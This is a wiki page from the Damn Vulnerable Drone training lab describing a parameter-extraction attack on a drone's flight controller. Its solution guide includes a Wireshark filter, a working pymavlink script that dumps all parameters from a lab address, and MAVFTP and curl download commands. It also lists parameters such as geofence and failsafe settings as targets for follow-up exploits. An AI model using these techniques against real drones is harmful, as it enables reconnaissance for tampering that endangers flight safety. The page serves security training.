<i>Extracting flight controller parameters via MAVLink or MAVFTP for reconnaissance or offline tampering.</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Exfiltration > Parameter Extraction

# Description

The flight controller stores all its runtime configuration in a parameter table, including failsafe triggers, flight mode settings, sensor calibration, geofence data, and more. These parameters can be exfiltrated via MAVLink messages or via file download (e.g., MAVFTP) without needing to modify or control the drone's flight behavior.

This attack allows an adversary to perform detailed offline analysis of how the drone is configured — and use this intel to craft precise follow-up exploits (e.g., override RTL behavior, disable geofence, mislead operators).

# Resources

- <a href="https://mavlink.io/en/messages/common.html#PARAM_REQUEST_LIST">MAVLink PARAM_REQUEST_LIST</a>  
- <a href="https://mavlink.io/en/messages/common.html#PARAM_VALUE">MAVLink PARAM_VALUE</a>  
- <a href="https://github.com/ArduPilot/MAVProxy">MAVProxy</a>  
- <a href="https://ardupilot.org/copter/docs/parameters.html">ArduPilot Parameters Reference</a>

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

<h3>Approach 1: Passive Parameter Capture</h3>

If you're already eavesdropping on a telemetry link (e.g., using Wireshark), listen for <code>PARAM_VALUE</code> messages. These are broadcast in response to parameter list requests.

Filter in Wireshark:
<pre><code class="code mb-3 mt-3">mavlink.message.name == "PARAM_VALUE"
</code></pre>

Log all observed parameter names and values.

---

<h3>Approach 2: Active Parameter Dump Using pymavlink</h3>

Create a Python script to request and receive all parameters:

<pre><code class="code mb-3 mt-3">from pymavlink import mavutil

master = mavutil.mavlink_connection('tcp:10.13.0.3:5760')
master.wait_heartbeat()
print("[+] Connected")

master.mav.param_request_list_send(
    master.target_system,
    master.target_component
)

while True:
    msg = master.recv_match(type='PARAM_VALUE', blocking=True)
    print(f"{msg.param_id.decode('utf-8')}: {msg.param_value}")
</code></pre>

This will dump all active parameter values to stdout.

---

<h3>Approach 3: Download Parameters via MAVFTP</h3>

Use MAVProxy’s <code>mavftp</code> module or direct curl access to download:

<pre><code class="code mb-3 mt-3">module load mavftp
get /APM/Parameters.parm
</code></pre>

Or retrieve it via browser or curl if exposed:

<pre><code class="code mb-3 mt-3">curl http://localhost:3000/download/parameters
</code></pre>

---

<h3>Sample Parameters of Interest</h3>

| Parameter       | Description                           |
|----------------|---------------------------------------|
| `FENCE_ENABLE`  | Whether geofencing is enabled        |
| `RTL_ALT`       | Return-to-launch altitude            |
| `ARMING_CHECK`  | Sensor arming validation flags       |
| `GPS_AUTO_SWITCH` | GPS failover behavior              |
| `GCS_FAILSAFE`  | Whether GCS loss triggers failsafe   |

</details>
